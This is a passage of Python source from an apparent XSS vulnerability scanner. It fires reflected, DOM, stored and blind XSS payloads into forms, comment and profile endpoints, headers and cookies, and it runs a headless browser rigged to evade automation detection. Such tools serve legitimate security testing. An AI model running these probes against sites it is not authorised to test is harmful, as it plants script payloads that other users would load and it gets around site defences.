                                evidence="Payload reflected in JSON response",
                                confidence=0.7,
                                severity="high" if "<script>" in payload else "medium",
                                location="response_body"
                            )
                            vulnerabilities.append(vuln)

                except Exception as e:
                    logging.debug(f"JSON test failed for {endpoint}: {e}")

        return vulnerabilities

    def test_form_data(self, url: str, http_client: AdvancedHTTPClient,
                       payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test form data (POST parameters) for XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_reflected_payloads()

        # Common form field names
        form_fields = ['username', 'email', 'comment', 'message', 'content',
                       'title', 'description', 'name', 'search', 'query']

        for field in form_fields:
            for payload in payloads[:min(10, self.config.payload_count)]:
                try:
                    form_data = {field: payload}
                    response = http_client.post(url, data=form_data)

                    if self.is_payload_reflected(payload, response.text):
                        if self.verify_xss(url, payload, http_client):
                            vuln = Vulnerability(
                                id=hashlib.md5(f"form:{url}:{field}".encode()).hexdigest()[:16],
                                type="reflected",
                                url=url,
                                method="POST",
                                parameter=field,
                                payload=payload,
                                evidence=f"Payload reflected via form field '{field}'",
                                confidence=0.8,
                                severity="high" if "<script>" in payload else "medium",
                                location="response_body"
                            )
                            vulnerabilities.append(vuln)

                except Exception as e:
                    logging.debug(f"Form test failed for {field}: {e}")

        return vulnerabilities

    def is_payload_reflected(self, payload: str, response_text: str) -> bool:
        """Check if payload is reflected in response"""
        # Check for exact reflection
        if payload in response_text:
            return True

        # Check for encoded reflection
        encoded_payloads = [
            html.escape(payload),
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            quote(payload),
            base64.b64encode(payload.encode()).decode(),
            payload.replace('"', '&quot;').replace("'", '&#x27;'),
            payload.replace('<', '%3C').replace('>', '%3E'),
            payload.replace('<', '\\u003C').replace('>', '\\u003E'),
        ]

        for encoded in encoded_payloads:
            if encoded in response_text:
                return True

        # Check for partial reflection (common in frameworks)
        if len(payload) > 10:
            # Check first and last parts
            first_part = payload[:min(10, len(payload) // 2)]
            last_part = payload[-min(10, len(payload) // 2):]

            if first_part in response_text and last_part in response_text:
                return True

        return False

    def verify_xss(self, url: str, payload: str, http_client: AdvancedHTTPClient) -> bool:
        """Verify XSS by checking if payload executes"""
        # Method 1: Use JavaScript engine if available
        if JS2PY_AVAILABLE:
            try:
                context = js2py.EvalJs()
                # Set up mock browser environment
                context.execute("""
                    window = {};
                    window.alert = function() { return true; };
                    window.confirm = function() { return true; };
                    window.prompt = function() { return true; };
                    document = {};
                    document.write = function(str) { return str.includes('script') || str.includes('alert'); };
                    document.body = {};
                    document.body.innerHTML = "";
                    location = {};
                    location.href = "";
                """)

                # Try to execute safe version of payload
                safe_payload = self.make_payload_safe(payload)
                try:
                    result = context.eval(safe_payload)
                    return bool(result)
                except:
                    pass
            except Exception as e:
                logging.debug(f"JS2Py verification failed: {e}")

        # Method 2: Check if payload would execute in browser
        # This is a heuristic approach
        execution_indicators = [
            ('<script>', '</script>'),
            ('<img', 'onerror='),
            ('<svg', 'onload='),
            ('<body', 'onload='),
            ('javascript:', 'alert('),
            ('data:text/html', '<script>')
        ]

        for start, end in execution_indicators:
            if start in payload and end in payload:
                return True

        # Method 3: Check reflection context
        # If payload is reflected without encoding in script context
        test_response = http_client.get(url).text
        if payload in test_response:
            # Check context around the reflection
            idx = test_response.find(payload)
            if idx > 0:
                before = test_response[max(0, idx - 50):idx]
                after = test_response[idx + len(payload):idx + len(payload) + 50]

                # Check if in script tag
                if '<script>' in before.lower() and '</script>' in after.lower():
                    return True
                # Check if in HTML attribute
                if before.rstrip().endswith('="') or before.rstrip().endswith("='"):
                    if after.startswith('"') or after.startswith("'"):
                        return True

        return False

    def make_payload_safe(self, payload: str) -> str:
        """Make payload safe for JavaScript evaluation"""
        safe = payload

        # Remove script tags but keep content
        safe = safe.replace('<script>', '').replace('</script>', '')

        # Remove dangerous functions in safe mode
        dangerous = ['document.write', 'eval', 'Function', 'setTimeout', 'setInterval']
        for func in dangerous:
            safe = safe.replace(func, f"safe_{func}")

        # Escape quotes
        safe = safe.replace('"', '\\"').replace("'", "\\'")

        return safe

    def create_vulnerability(self, url: str, param: str, payload: str,
                             response: requests.Response, vuln_type: str) -> Vulnerability:
        """Create vulnerability object"""
        vuln_id = hashlib.md5(f"{url}:{param}:{payload}".encode()).hexdigest()[:16]

        # Determine severity
        if any(tag in payload for tag in ['<script>', 'javascript:', 'onload=', 'onerror=']):
            severity = "high"
        elif any(tag in payload for tag in ['<img', '<svg', '<body']):
            severity = "medium"
        else:
            severity = "low"

        # Check reflection context for better confidence
        reflection_context = self.get_reflection_context(payload, response.text)
        confidence = 0.8

        if reflection_context == "script":
            confidence = 0.9
            severity = "critical"
        elif reflection_context == "attribute":
            confidence = 0.85
        elif reflection_context == "html":
            confidence = 0.8

        return Vulnerability(
            id=vuln_id,
            type=vuln_type,
            url=url,
            method="GET",
            parameter=param,
            payload=payload,
            evidence=f"Payload reflected in {reflection_context} context",
            http_request=f"GET {url}",
            http_response=f"Status: {response.status_code}, Length: {len(response.text)}",
            confidence=confidence,
            severity=severity,
            location="response_body",
            context={"reflection_context": reflection_context}
        )

    def get_reflection_context(self, payload: str, response_text: str) -> str:
        """Determine where payload is reflected in the response"""
        if payload not in response_text:
            return "unknown"

        idx = response_text.find(payload)
        before = response_text[max(0, idx - 100):idx]
        after = response_text[idx + len(payload):idx + len(payload) + 100]

        # Check script context
        script_start = before.rfind('<script')
        if script_start != -1 and '</script>' not in before[script_start:]:
            # Check if we're inside script tag
            if '</script>' not in before[script_start:] or '</script>' in after:
                return "script"

        # Check HTML attribute context
        last_quote = max(before.rfind('"'), before.rfind("'"), before.rfind('`'))
        if last_quote != -1:
            # Check if payload starts after a quote
            quote_char = before[last_quote]
            if after.startswith(quote_char):
                return "attribute"

        # Check HTML tag context
        last_lt = before.rfind('<')
        if last_lt != -1:
            tag_content = before[last_lt:]
            if '>' not in tag_content:
                return "html_tag"

        # Check URL context
        if 'href=' in before or 'src=' in before or 'action=' in before:
            return "url"

        return "html_body"

    def advanced_reflection_analysis(self, url: str, param: str, payload: str,
                                     response: requests.Response) -> Dict[str, Any]:
        """Perform advanced analysis of reflection"""
        analysis = {
            'exact_reflection': False,
            'encoded_reflection': False,
            'partial_reflection': False,
            'context': 'unknown',
            'truncation': False,
            'filter_attempts': []
        }

        response_text = response.text

        # Check exact reflection
        if payload in response_text:
            analysis['exact_reflection'] = True

        # Check encoded reflection
        encodings = {
            'html': html.escape(payload),
            'url': quote(payload),
            'base64': base64.b64encode(payload.encode()).decode(),
            'unicode': payload.encode('unicode_escape').decode()
        }

        for encoding_type, encoded in encodings.items():
            if encoded in response_text:
                analysis['encoded_reflection'] = True
                analysis['filter_attempts'].append(f"{encoding_type}_encoding")

        # Check for filtering/truncation
        if not analysis['exact_reflection']:
            # Check for keyword filtering
            filtered_parts = []
            for keyword in ['script', 'alert', 'onerror', 'onload', 'javascript']:
                if keyword in payload.lower() and keyword not in response_text.lower():
                    filtered_parts.append(keyword)

            if filtered_parts:
                analysis['filter_attempts'].append(f"keyword_filter:{','.join(filtered_parts)}")

            # Check for length truncation
            if len(payload) > 50:
                for i in range(10, len(payload), 10):
                    if payload[:i] in response_text and payload[i:] not in response_text:
                        analysis['truncation'] = True
                        analysis['filter_attempts'].append(f"truncated_at_{i}_chars")
                        break

        # Determine context
        analysis['context'] = self.get_reflection_context(payload, response_text)

        return analysis

    def is_valid_test_url(self, url: str) -> bool:
        """Check if URL is valid for testing"""
        try:
            parsed = urlparse(url)

            # Skip javascript: and data: URLs for HTTP requests
            if parsed.scheme in ['javascript', 'data', 'file', 'mailto', 'tel']:
                return False

            # Check for malformed URLs
            if not parsed.netloc and not url.startswith(('http://', 'https://')):
                return False

            # Check for obvious payloads in the hostname (like collaborator URLs)
            if 'collaborator' in parsed.netloc.lower() or 'interactsh' in parsed.netloc.lower():
                return False

            # Validate the URL structure
            if parsed.scheme not in ['http', 'https', '']:
                return False

            return True
        except Exception:
            return False


class DOMXSSDetector:
    """Detect DOM-based XSS vulnerabilities"""

    def __init__(self, config: ScannerConfig = None):
        self.config = config or ScannerConfig()
        self.sources = [
            'location.hash', 'location.search', 'document.URL',
            'document.referrer', 'window.name', 'localStorage',
            'sessionStorage', 'document.cookie', 'postMessage',
            'URLSearchParams', 'history.pushState'
        ]
        self.sinks = [
            'innerHTML', 'outerHTML', 'document.write',
            'document.writeln', 'eval', 'Function',
            'setTimeout', 'setInterval', 'execScript',
            'location', 'location.href', 'location.assign',
            'location.replace', 'open', 'window.open'
        ]
        self.payload_generator = XSSPayloadGenerator()

    def test(self, url: str, http_client: AdvancedHTTPClient,
             payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test for DOM XSS using Selenium"""
        vulnerabilities = []

        if not SELENIUM_AVAILABLE:
            logging.warning("Selenium not available for DOM XSS testing")
            return vulnerabilities

        try:
            # Launch browser
            driver = self.get_headless_browser()
            driver.get(url)

            # Wait for page to load
            time.sleep(3)

            # Get page source after JavaScript execution
            rendered_html = driver.page_source

            # Analyze JavaScript
            js_analysis = self.analyze_javascript(driver)

            # Test DOM XSS vectors
            vulnerabilities.extend(self.test_hash_based(driver, payload_generator))
            vulnerabilities.extend(self.test_postmessage(driver, payload_generator))
            vulnerabilities.extend(self.test_local_storage(driver, payload_generator))
            vulnerabilities.extend(self.test_url_parameters(driver, payload_generator))
            vulnerabilities.extend(self.test_document_write(driver, payload_generator))
            vulnerabilities.extend(self.test_innerhtml(driver, payload_generator))

            # Analyze static JavaScript
            static_vulns = self.analyze_static_javascript(rendered_html)
            vulnerabilities.extend(static_vulns)

            driver.quit()

        except Exception as e:
            logging.error(f"DOM XSS test failed for {url}: {e}")

        return vulnerabilities

    def get_headless_browser(self):
        """Get headless browser instance"""
        options = ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')

        # Disable images for faster loading
        prefs = {"profile.managed_default_content_settings.images": 2}
        options.add_experimental_option("prefs", prefs)

        # Add experimental options to avoid detection
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument('--disable-blink-features=AutomationControlled')

        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(30)

        # Execute CDP commands to avoid detection
        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
            'source': '''
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined
                });
            '''
        })

        return driver

    def analyze_javascript(self, driver) -> Dict:
        """Analyze JavaScript on page"""
        analysis = {
            'sources_found': [],
            'sinks_found': [],
            'data_flows': [],
            'event_listeners': [],
            'dom_manipulations': []
        }

        try:
            # Execute JavaScript to find sources and sinks
            js_code = """
            var sources = [];
            var sinks = [];
            var events = [];
            var manipulations = [];

            // Check for common sources
            if (window.location && window.location.hash) sources.push('location.hash');
            if (window.location && window.location.search) sources.push('location.search');
            if (document.URL) sources.push('document.URL');
            if (document.referrer) sources.push('document.referrer');
            if (window.name) sources.push('window.name');
            if (document.cookie) sources.push('document.cookie');
            if (window.localStorage) sources.push('localStorage');
            if (window.sessionStorage) sources.push('sessionStorage');

            // Check for common sinks in code (simplified check)
            var scripts = document.getElementsByTagName('script');
            for (var i = 0; i < scripts.length; i++) {
                var scriptContent = scripts[i].textContent || scripts[i].innerText;
                if (scriptContent.includes('innerHTML')) sinks.push('innerHTML');
                if (scriptContent.includes('outerHTML')) sinks.push('outerHTML');
                if (scriptContent.includes('document.write')) sinks.push('document.write');
                if (scriptContent.includes('eval(')) sinks.push('eval');
                if (scriptContent.includes('Function(')) sinks.push('Function');
            }

            // Return results
            return {
                sources: Array.from(new Set(sources)),
                sinks: Array.from(new Set(sinks)),
                events: events,
                manipulations: manipulations
            };
            """

            result = driver.execute_script(js_code)
            analysis['sources_found'] = result.get('sources', [])
            analysis['sinks_found'] = result.get('sinks', [])
            analysis['event_listeners'] = result.get('events', [])
            analysis['dom_manipulations'] = result.get('manipulations', [])

        except Exception as e:
            logging.debug(f"JS analysis failed: {e}")

        return analysis

    def test_hash_based(self, driver, payload_generator) -> List[Vulnerability]:
        """Test hash-based DOM XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_dom_payloads()

        for payload in payloads[:self.config.payload_count]:
            try:
                test_url = f"{driver.current_url}#{payload}"
                driver.get(test_url)
                time.sleep(1)

                # Check if payload executed
                if self.check_payload_execution(payload, driver):
                    vuln = Vulnerability(
                        id=hashlib.md5(f"hash:{test_url}".encode()).hexdigest()[:16],
                        type="dom",
                        url=test_url,
                        method="GET",
                        parameter="hash",
                        payload=payload,
                        evidence="Hash-based DOM XSS",
                        confidence=0.7,
                        severity="medium",
                        cwe=["CWE-79"]
                    )
                    vulnerabilities.append(vuln)

            except Exception as e:
                logging.debug(f"Hash test failed: {e}")

        return vulnerabilities

    def test_postmessage(self, driver, payload_generator) -> List[Vulnerability]:
        """Test postMessage-based DOM XSS"""
        vulnerabilities = []

        try:
            # Inject iframe to test postMessage
            iframe_script = """
            var iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            document.body.appendChild(iframe);
            return iframe.contentWindow;
            """

            target_window = driver.execute_script(iframe_script)

            # Test postMessage payloads
            payloads = [
                {"data": "<script>alert(1)</script>", "origin": "*"},
                {"data": "<img src=x onerror=alert(1)>", "origin": driver.current_url},
                {"data": "javascript:alert(1)", "origin": "*"}
            ]

            for payload_data in payloads:
                try:
                    postmessage_script = f"""
                    window.postMessage({json.dumps(payload_data['data'])}, '{payload_data['origin']}');
                    return true;
                    """
                    driver.execute_script(postmessage_script)
                    time.sleep(1)

                    # Check for alerts or errors
                    if self.check_for_alerts(driver):
                        vuln = Vulnerability(
                            id=hashlib.md5(f"postmessage:{driver.current_url}".encode()).hexdigest()[:16],
                            type="dom",
                            url=driver.current_url,
                            method="POST",
                            parameter="postMessage",
                            payload=str(payload_data),
                            evidence="postMessage DOM XSS",
                            confidence=0.6,
                            severity="high",
                            cwe=["CWE-79"]
                        )
                        vulnerabilities.append(vuln)

                except Exception as e:
                    logging.debug(f"postMessage test failed: {e}")

        except Exception as e:
            logging.debug(f"postMessage setup failed: {e}")

        return vulnerabilities

    def test_local_storage(self, driver, payload_generator) -> List[Vulnerability]:
        """Test localStorage-based DOM XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_dom_payloads()

        for payload in payloads[:min(5, self.config.payload_count)]:
            try:
                # Set localStorage
                set_script = f"""
                localStorage.setItem('xss_test', '{payload}');
                return localStorage.getItem('xss_test');
                """

                result = driver.execute_script(set_script)

                # Try to trigger retrieval and execution
                trigger_script = """
                var stored = localStorage.getItem('xss_test');
                if (stored && stored.includes('<script>')) {
                    // Simulate eval
                    return true;
                }
                return false;
                """

                triggered = driver.execute_script(trigger_script)
                if triggered:
                    vuln = Vulnerability(
                        id=hashlib.md5(f"localstorage:{driver.current_url}".encode()).hexdigest()[:16],
                        type="dom",
                        url=driver.current_url,
                        method="GET",
                        parameter="localStorage",
                        payload=payload,
                        evidence="localStorage DOM XSS",
                        confidence=0.5,
                        severity="medium",
                        cwe=["CWE-79"]
                    )
                    vulnerabilities.append(vuln)

            except Exception as e:
                logging.debug(f"localStorage test failed: {e}")

        return vulnerabilities

    def test_url_parameters(self, driver, payload_generator) -> List[Vulnerability]:
        """Test URL parameter-based DOM XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_dom_payloads()
        current_url = driver.current_url
        parsed = urlparse(current_url)

        # Test URL.searchParams
        for payload in payloads[:min(10, self.config.payload_count)]:
            try:
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?test={payload}"
                driver.get(test_url)
                time.sleep(1)

                # Check if URL parameters are used dangerously
                check_script = f"""
                var urlParams = new URLSearchParams(window.location.search);
                var testParam = urlParams.get('test');
                if (testParam && testParam.includes('<')) {{
                    // Check if it's used in dangerous sinks
                    var scripts = document.getElementsByTagName('script');
                    for (var i = 0; i < scripts.length; i++) {{
                        if (scripts[i].textContent.includes(testParam)) {{
                            return true;
                        }}
                    }}
                }}
                return false;
                """

                is_dangerous = driver.execute_script(check_script)
                if is_dangerous:
                    vuln = Vulnerability(
                        id=hashlib.md5(f"urlparam:{test_url}".encode()).hexdigest()[:16],
                        type="dom",
                        url=test_url,
                        method="GET",
                        parameter="test",
                        payload=payload,
                        evidence="URL parameter DOM XSS",
                        confidence=0.7,
                        severity="high",
                        cwe=["CWE-79"]
                    )
                    vulnerabilities.append(vuln)

            except Exception as e:
                logging.debug(f"URL parameter test failed: {e}")

        return vulnerabilities

    def test_document_write(self, driver, payload_generator) -> List[Vulnerability]:
        """Test document.write-based DOM XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_dom_payloads()

        for payload in payloads[:min(5, self.config.payload_count)]:
            try:
                # Inject script that uses document.write
                test_script = f"""
                try {{
                    document.write('{payload}');
                    return true;
                }} catch(e) {{
                    return false;
                }}
                """

                result = driver.execute_script(test_script)
                time.sleep(0.5)

                if result:
                    # Check if payload appears in DOM
                    check_script = f"""
                    return document.body.innerHTML.includes('{payload}');
                    """

                    appears = driver.execute_script(check_script)
                    if appears:
                        vuln = Vulnerability(
                            id=hashlib.md5(f"documentwrite:{driver.current_url}".encode()).hexdigest()[:16],
                            type="dom",
                            url=driver.current_url,
                            method="GET",
                            parameter="document.write",
                            payload=payload,
                            evidence="document.write DOM XSS",
                            confidence=0.8,
                            severity="high",
                            cwe=["CWE-79"]
                        )
                        vulnerabilities.append(vuln)

            except Exception as e:
                logging.debug(f"document.write test failed: {e}")

        return vulnerabilities

    def test_innerhtml(self, driver, payload_generator) -> List[Vulnerability]:
        """Test innerHTML-based DOM XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_dom_payloads()

        for payload in payloads[:min(10, self.config.payload_count)]:
            try:
                # Create test element and set innerHTML
                test_script = f"""
                var testDiv = document.createElement('div');
                testDiv.id = 'xss_test_div';
                document.body.appendChild(testDiv);
                testDiv.innerHTML = '{payload}';
                return testDiv.innerHTML;
                """

                result = driver.execute_script(test_script)

                # Check if script was executed
                check_script = """
                var testDiv = document.getElementById('xss_test_div');
                if (testDiv) {
                    var scripts = testDiv.getElementsByTagName('script');
                    return scripts.length > 0;
                }
                return false;
                """

                has_scripts = driver.execute_script(check_script)
                if has_scripts:
                    vuln = Vulnerability(
                        id=hashlib.md5(f"innerhtml:{driver.current_url}".encode()).hexdigest()[:16],
                        type="dom",
                        url=driver.current_url,
                        method="GET",
                        parameter="innerHTML",
                        payload=payload,
                        evidence="innerHTML DOM XSS",
                        confidence=0.9,
                        severity="high",
                        cwe=["CWE-79"]
                    )
                    vulnerabilities.append(vuln)

                # Clean up
                cleanup_script = """
                var testDiv = document.getElementById('xss_test_div');
                if (testDiv) {
                    testDiv.remove();
                }
                """
                driver.execute_script(cleanup_script)

            except Exception as e:
                logging.debug(f"innerHTML test failed: {e}")

        return vulnerabilities

    def analyze_static_javascript(self, html_content: str) -> List[Vulnerability]:
        """Analyze static JavaScript for DOM XSS patterns"""
        vulnerabilities = []

        # Extract JavaScript from page
        if BS4_AVAILABLE:
            soup = BeautifulSoup(html_content, 'html.parser')
            scripts = soup.find_all('script')

            for i, script in enumerate(scripts):
                if script.string:
                    js_content = script.string
                    line_number = 1

                    # Check for source-to-sink patterns
                    for source in self.sources:
                        for sink in self.sinks:
                            # Pattern: source → sink
                            pattern = rf'{source}.*?{sink}'
                            if re.search(pattern, js_content, re.IGNORECASE | re.DOTALL):
                                vuln = Vulnerability(
                                    id=hashlib.md5(f"staticjs:{i}:{line_number}".encode()).hexdigest()[:16],
                                    type="dom",
                                    url="javascript",
                                    method="GET",
                                    parameter=f"source:{source}",
                                    payload=f"sink:{sink}",
                                    evidence=f"Static JS analysis: {source} → {sink}",
                                    confidence=0.6,
                                    severity="medium",
                                    cwe=["CWE-79"],
                                    context={
                                        "script_index": i,
                                        "line": line_number,
                                        "pattern": f"{source} → {sink}"
                                    }
                                )
                                vulnerabilities.append(vuln)

        return vulnerabilities

    def check_payload_execution(self, payload: str, driver) -> bool:
        """Check if payload was executed"""
        try:
            # Method 1: Check for alert
            check_script = """
            return window.alertWasCalled || false;
            """

            # Inject monitoring
            monitor_script = """
            window.alertWasCalled = false;
            var originalAlert = window.alert;
            window.alert = function() {
                window.alertWasCalled = true;
                return originalAlert.apply(this, arguments);
            };
            """
            driver.execute_script(monitor_script)

            # Check if alert was called
            alert_called = driver.execute_script(check_script)
            if alert_called:
                return True

            # Method 2: Check if payload appears in DOM
            check_dom_script = f"""
            return document.body.innerHTML.includes('{payload[:50]}');
            """
            in_dom = driver.execute_script(check_dom_script)

            # Method 3: Check for script tags
            check_scripts_script = """
            var scripts = document.getElementsByTagName('script');
            for (var i = 0; i < scripts.length; i++) {
                if (scripts[i].src.includes('alert') || 
                    scripts[i].textContent.includes('alert')) {
                    return true;
                }
            }
            return false;
            """
            has_scripts = driver.execute_script(check_scripts_script)

            return in_dom or has_scripts

        except Exception as e:
            logging.debug(f"Payload execution check failed: {e}")
            return False

    def check_for_alerts(self, driver) -> bool:
        """Check if any alerts were triggered"""
        try:
            check_script = """
            return window.xssAlertTriggered || false;
            """
            return driver.execute_script(check_script)
        except:
            return False


class StoredXSSDetector:
    """Detect stored XSS vulnerabilities"""

    def __init__(self, config: ScannerConfig = None):
        self.config = config or ScannerConfig()
        self.payload_generator = XSSPayloadGenerator()

    def test(self, url: str, http_client: AdvancedHTTPClient,
             payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test for stored XSS"""
        vulnerabilities = []

        try:
            # First, crawl to find input forms
            crawler = WebCrawler(http_client, ScannerConfig(max_pages=10))
            pages = crawler.crawl(url)

            for page in pages:
                for form in page.forms:
                    form_vulns = self.test_form(page.url, form, http_client, payload_generator)
                    vulnerabilities.extend(form_vulns)

                # Also test comment systems, search, etc.
                comment_vulns = self.test_comment_system(page.url, http_client, payload_generator)
                vulnerabilities.extend(comment_vulns)

                profile_vulns = self.test_profile_fields(page.url, http_client, payload_generator)
                vulnerabilities.extend(profile_vulns)

        except Exception as e:
            logging.error(f"Stored XSS test failed for {url}: {e}")

        return vulnerabilities

    def test_form(self, url: str, form: Dict, http_client: AdvancedHTTPClient,
                  payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test form for stored XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_stored_payloads()

        for payload in payloads[:self.config.payload_count]:
            try:
                # Prepare form data
                form_data = {}
                for input_field in form['inputs']:
                    if input_field['name'] and input_field['type'] not in ['submit', 'button', 'reset']:
                        form_data[input_field['name']] = payload

                # Skip if no valid fields
                if not form_data:
                    continue

                # Submit form
                action_url = urljoin(url, form['action']) if form['action'] else url
                if form['method'] == 'POST':
                    response = http_client.post(action_url, data=form_data)
                else:
                    response = http_client.get(action_url, params=form_data)

                # Check if payload was stored
                if self.is_payload_stored(payload, url, http_client):
                    # Verify it's retrievable
                    if self.can_retrieve_payload(payload, url, http_client):
                        vuln = Vulnerability(
                            id=hashlib.md5(f"stored:{url}:{form['action']}".encode()).hexdigest()[:16],
                            type="stored",
                            url=url,
                            method=form['method'],
                            parameter="form_submission",
                            payload=payload,
                            evidence="Payload appears to be stored and retrievable",
                            confidence=0.8,
                            severity="high",
                            cwe=["CWE-79"],
                            context={
                                "form_action": form['action'],
                                "form_method": form['method'],
                                "form_fields": list(form_data.keys())
                            }
                        )
                        vulnerabilities.append(vuln)

            except Exception as e:
                logging.debug(f"Form test failed: {e}")

        return vulnerabilities

    def test_comment_system(self, url: str, http_client: AdvancedHTTPClient,
                            payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test comment systems for stored XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_stored_payloads()

        # Common comment endpoints
        comment_endpoints = [
            f"{url}/comment",
            f"{url}/comments",
            f"{url}/post/comment",
            f"{url}/add/comment",
            f"{url}/submit/comment"
        ]

        for endpoint in comment_endpoints:
            for payload in payloads[:min(10, self.config.payload_count)]:
                try:
                    comment_data = {
                        'comment': payload,
                        'message': payload,
                        'content': payload,
                        'text': payload,
                        'body': payload
                    }

                    # Try POST
                    response = http_client.post(endpoint, data=comment_data)

                    if response.status_code in [200, 201, 302]:
                        # Check if comment appears on page
                        if self.is_payload_stored(payload, url, http_client):
                            vuln = Vulnerability(
                                id=hashlib.md5(f"comment:{endpoint}".encode()).hexdigest()[:16],
                                type="stored",
                                url=endpoint,
                                method="POST",
                                parameter="comment",
                                payload=payload,
                                evidence="Comment system stores XSS payload",
                                confidence=0.7,
                                severity="high",
                                cwe=["CWE-79"]
                            )
                            vulnerabilities.append(vuln)

                except Exception as e:
                    logging.debug(f"Comment test failed for {endpoint}: {e}")

        return vulnerabilities

    def test_profile_fields(self, url: str, http_client: AdvancedHTTPClient,
                            payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test user profile fields for stored XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_stored_payloads()

        # Common profile endpoints
        profile_endpoints = [
            f"{url}/profile",
            f"{url}/account",
            f"{url}/user",
            f"{url}/settings",
            f"{url}/edit/profile"
        ]

        for endpoint in profile_endpoints:
            for payload in payloads[:min(5, self.config.payload_count)]:
                try:
                    profile_data = {
                        'name': payload,
                        'username': payload,
                        'bio': payload,
                        'description': payload,
                        'signature': payload,
                        'title': payload
                    }

                    response = http_client.post(endpoint, data=profile_data)

                    if response.status_code in [200, 201, 302]:
                        # Visit profile page to check
                        profile_page = f"{url}/user/{payload}" if '/user/' in url else f"{url}/profile"
                        profile_response = http_client.get(profile_page)

                        if payload in profile_response.text:
                            vuln = Vulnerability(
                                id=hashlib.md5(f"profile:{endpoint}".encode()).hexdigest()[:16],
                                type="stored",
                                url=endpoint,
                                method="POST",
                                parameter="profile_field",
                                payload=payload,
                                evidence="Profile field stores XSS payload",
                                confidence=0.8,
                                severity="high",
                                cwe=["CWE-79"]
                            )
                            vulnerabilities.append(vuln)

                except Exception as e:
                    logging.debug(f"Profile test failed for {endpoint}: {e}")

        return vulnerabilities

    def is_payload_stored(self, payload: str, url: str,
                          http_client: AdvancedHTTPClient) -> bool:
        """Check if payload is stored and retrievable"""
        try:
            # Make new request to see if payload appears
            response = http_client.get(url)

            # Check for exact match
            if payload in response.text:
                return True

            # Check for encoded versions
            encoded_versions = [
                html.escape(payload),
                payload.replace('<', '&lt;').replace('>', '&gt;'),
                quote(payload)
            ]

            for encoded in encoded_versions:
                if encoded in response.text:
                    return True

            return False
        except:
            return False

    def can_retrieve_payload(self, payload: str, url: str,
                             http_client: AdvancedHTTPClient) -> bool:
        """Check if stored payload can be retrieved by other users"""
        try:
            # Try to access from different "session"
            # Create new session without cookies
            temp_client = AdvancedHTTPClient(self.config)

            # Get the page
            response = temp_client.get(url)

            # Check for payload
            return payload in response.text

        except Exception as e:
            logging.debug(f"Payload retrieval check failed: {e}")
            return False


class BlindXSSDetector:
    """Detect blind XSS vulnerabilities"""

    def __init__(self, config: ScannerConfig = None):
        self.config = config or ScannerConfig()
        self.payload_generator = XSSPayloadGenerator()
        self.collaborator_url = None  # Would be set to actual collaborator

    def test(self, url: str, http_client: AdvancedHTTPClient,
             payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test for blind XSS"""
        vulnerabilities = []

        # Test with payloads that would trigger if executed
        payloads = payload_generator.get_blind_payloads()

        for payload in payloads[:self.config.payload_count]:
            try:
                # Test in various contexts
                contexts_tested = self.test_blind_contexts(url, payload, http_client)

                if contexts_tested:
                    # Create vulnerability (would need collaborator to verify)
                    vuln = Vulnerability(
                        id=hashlib.md5(f"blind:{url}:{payload[:20]}".encode()).hexdigest()[:16],
                        type="blind",
                        url=url,
                        method="GET",
                        parameter="multiple",
                        payload=payload,
                        evidence="Blind XSS payload submitted",
                        confidence=0.3,  # Low without collaborator verification
                        severity="medium",
                        cwe=["CWE-79"],
                        context={
                            "contexts_tested": contexts_tested,
                            "requires_collaborator": True
                        }
                    )
                    vulnerabilities.append(vuln)

            except Exception as e:
                logging.debug(f"Blind XSS test failed: {e}")

        return vulnerabilities

    def test_blind_contexts(self, url: str, payload: str,
                            http_client: AdvancedHTTPClient) -> List[str]:
        """Test payload in different blind XSS contexts"""
        contexts_tested = []

        # Test in User-Agent
        try:
            headers = {'User-Agent': payload}
            response = http_client.get(url, headers=headers)
            if response.status_code < 500:  # Successful request
                contexts_tested.append('User-Agent')
        except:
            pass

        # Test in Referer
        try:
            headers = {'Referer': payload}
            response = http_client.get(url, headers=headers)
            if response.status_code < 500:
                contexts_tested.append('Referer')
        except:
            pass

        # Test in cookies
        try:
            http_client.session.cookies.set('XSS_Test', payload)
            response = http_client.get(url)
            if response.status_code < 500:
                contexts_tested.append('Cookie')
        except:
            pass

        # Test in X-Forwarded-For
        try:
            headers = {'X-Forwarded-For': payload}
            response = http_client.get(url, headers=headers)
            if response.status_code < 500:
                contexts_tested.append('X-Forwarded-For')
        except:
            pass

        # Test in query parameters
        try:
            test_url = f"{url}?test={payload}"
            response = http_client.get(test_url)
            if response.status_code < 500:
                contexts_tested.append('Query-Parameter')
        except:
            pass

        # Test in form data
        try:
            form_data = {'input': payload, 'comment': payload, 'search': payload}
            response = http_client.post(url, data=form_data)
            if response.status_code < 500:
                contexts_tested.append('Form-Data')
        except:
            pass

        # Test in JSON body
        try:
            json_data = {'data': payload, 'query': payload, 'filter': payload}
            response = http_client.post(url, json=json_data)
            if response.status_code < 500:
                contexts_tested.append('JSON-Body')
        except:
            pass

        return contexts_tested

    def setup_collaborator(self):
        """Setup collaborator server for blind XSS testing"""
        # This would integrate with services like Burp Collaborator,
        # Interactsh, or self-hosted callback server

        collaborator_config = {
